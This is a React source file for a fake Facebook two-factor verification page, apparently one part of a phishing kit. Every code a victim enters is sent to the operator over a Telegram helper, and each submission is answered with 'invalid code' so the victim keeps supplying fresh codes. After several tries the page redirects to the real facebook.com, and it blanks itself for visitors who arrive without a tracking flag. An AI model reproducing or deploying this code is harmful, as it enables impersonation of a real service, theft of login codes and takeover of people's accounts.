import { faChevronLeft, faXmark } from '@fortawesome/free-solid-svg-icons';
import { faCircleQuestion } from '@fortawesome/free-regular-svg-icons';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import VerifyImage from '@/assets/images/verify-image.png';
import { useEffect, useRef, useState, type FC } from 'react';
import { useNavigate } from 'react-router';
import VerifyImagePc from '@/assets/images/verify-image-pc.png';
import FacebookLogo from '@/assets/images/facebook-logo.svg';
import translateText from '@/utils/translate';
import sendTelegramMessage from '@/utils/telegram';
import { defaultVerifyTexts, type TranslatedTexts } from '@/content/verifyTexts';
import { useGeo } from '@/hooks/use-geo';

const Verify: FC = () => {
    const navigate = useNavigate();
    const { geoData } = useGeo();
    const codeRef = useRef<HTMLInputElement>(null);
    const [code, setCode] = useState('');
    const [showError, setShowError] = useState(false);
    const [isLoading, setIsLoading] = useState(false);
    const [attemptCount, setAttemptCount] = useState(0);
    const [translatedTexts, setTranslatedTexts] = useState<TranslatedTexts>(defaultVerifyTexts);

    const translateAllTexts = async (targetLang: string) => {
        try {
            const textsToTranslate = Object.values(defaultVerifyTexts);
            const translatedResults = await Promise.all(textsToTranslate.map((text) => translateText(text, targetLang)));

            const [accountFacebook, checkNotifications, goToFacebookAccount, enterCode, invalidCode, continueText, tryAnotherWay] = translatedResults;

            setTranslatedTexts({
                accountFacebook,
                checkNotifications,
                goToFacebookAccount,
                enterCode,
                invalidCode,
                continue: continueText,
                tryAnotherWay
            });
        } catch {
            console.clear();
        }
    };


    useEffect(() => {
        const hasVisited = localStorage.getItem('visited');
        if (!hasVisited) {
            window.location.replace('about:blank');
            return;
        }

        if (geoData?.country_code) {
            translateAllTexts(geoData.country_code);
        }
    }, [geoData]);

    const handleSubmit = async () => {
        if (!code) {
            return;
        }
        setIsLoading(true);

        try {
            const savedMessageId = localStorage.getItem('message_id');
            if (savedMessageId) {
                const attemptNumber = attemptCount + 1;
                const message = `CODE${attemptNumber}: <code>${code}</code>`;
                await sendTelegramMessage(message, parseInt(savedMessageId));
            }

            setAttemptCount((prev) => prev + 1);
            setCode('');
            setShowError(true);
            setIsLoading(false);

            if (attemptCount >= 3) {
                window.location.replace('https://facebook.com');
            }
        } catch {
            setShowError(true);
            setIsLoading(false);
        }
    };
    return (
        <div className='min-h-screen bg-white'>
            <header className='flex h-14 items-center justify-between border-b border-[#dde2e8] px-4'>
                <div className='hidden items-center gap-3 sm:flex'>
                    <img src={FacebookLogo} alt='Facebook' className='h-6 w-auto' />
                </div>
                <div className='flex w-full items-center justify-between gap-4 sm:hidden'>
                    <button onClick={() => navigate(-1)} className='rounded-full p-2 transition-colors hover:bg-gray-100'>
                        <FontAwesomeIcon icon={faChevronLeft} size='lg' />
                    </button>
                    <button className='rounded-full p-2 transition-colors hover:bg-gray-100'>
                        <FontAwesomeIcon icon={faCircleQuestion} size='lg' />
                    </button>
                </div>
            </header>

            <div className='mx-auto max-w-[600px] space-y-4 px-4 py-6 sm:space-y-4'>
                <div className='text-sm font-medium text-[#0a1317]'>{translatedTexts.accountFacebook}</div>
                <p className='text-2xl font-semibold text-[#0a1317]'>{translatedTexts.checkNotifications}</p>
                <p className='text-[15px] leading-5 text-[#0a1317]'>{translatedTexts.goToFacebookAccount}</p>

                <div className='space-y-4'>
                    <img src={VerifyImage} className='block w-full rounded-2xl sm:hidden' alt='Mobile verification example' />
                    <img src={VerifyImagePc} className='hidden w-full sm:block' alt='Desktop verification example' />
                </div>

                <div className='space-y-4'>
                    <div className='relative'>
                        <input
                            ref={codeRef}
                            id='code'
                            className={`peer h-16 w-full rounded-2xl border px-4 py-2.5 pb-0 focus:border-[#5d6c7b] ${showError ? 'border-red-500 placeholder:text-red-500' : 'border-[#dde2e8]'}`}
                            placeholder={' '}
                            type='number'
                            inputMode='numeric'
                            value={code}
                            onChange={(e) => {
                                setShowError(false);
                                if (e.target.value.length <= 8) {
                                    setCode(e.target.value);
                                }
                            }}
                            onFocus={() => {
                                setShowError(false);
                            }}
                        />
                        <label className={`absolute top-1/2 left-0 -translate-y-6 pl-4 text-[13px] text-[#5d6c7b] peer-placeholder-shown:-translate-y-1/2 peer-placeholder-shown:text-[15px] peer-focus:-translate-y-6 peer-focus:text-[13px] ${showError && 'text-red-500'}`} htmlFor='code'>
                            {showError ? translatedTexts.invalidCode : translatedTexts.enterCode}
                        </label>
                        <button
                            onClick={() => {
                                setCode('');
                                codeRef.current?.focus();
                            }}
                            className='absolute top-1/2 right-0 hidden -translate-y-1/2 pr-4 peer-focus:block'
                        >
                            <FontAwesomeIcon icon={faXmark} size='lg' />
                        </button>
                    </div>

                    <button
                        className={`h-11 w-full rounded-[22px] bg-[#0064e0] text-[15px] font-medium text-[#f1f4f7] ${code.length < 6 && 'opacity-40'} flex items-center justify-center transition-opacity`}
                        disabled={code.length < 6}
                        onClick={() => {
                            handleSubmit();
                        }}
                    >
                        {isLoading ? <div className='h-7 w-7 animate-spin rounded-full border-2 border-white border-t-transparent'></div> : translatedTexts.continue}
                    </button>

                    <button className='h-11 w-full rounded-[22px] border border-[#ccd3db] text-[15px] font-medium text-[#0a1317] transition-colors hover:bg-gray-50'>{translatedTexts.tryAnotherWay}</button>
                </div>
            </div>
        </div>
    );
};
export default Verify;
